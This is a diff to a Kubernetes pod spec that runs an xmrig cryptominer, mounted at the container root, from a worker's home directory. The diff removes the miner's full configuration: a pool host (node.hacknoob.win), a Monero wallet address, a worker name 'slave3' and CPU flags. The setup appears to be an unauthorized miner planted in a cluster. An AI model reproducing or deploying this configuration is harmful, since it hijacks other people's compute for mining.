@@ -17,15 +17,6 @@ spec:
     image: busybox
     command:
     - /home/worker3/xmrig/build/xmrig
-    - -o
-    - node.hacknoob.win:18081
-    - -u
-    - 46DWjxWviwCVHbYHaMxjusjGKm55LJmG6f3YTCJDmTf2RxCLfQRx22fSRELvwq36kY6iSGD5tiUsSQ4AsE8UFnWFBDd1Lzn
-    - -p
-    - slave3
-    - --cpu-no-yield
-    - --nicehash
-    - --randomx-1gb-pages
     volumeMounts:
     - name: xmrig-volume-3
       mountPath: /
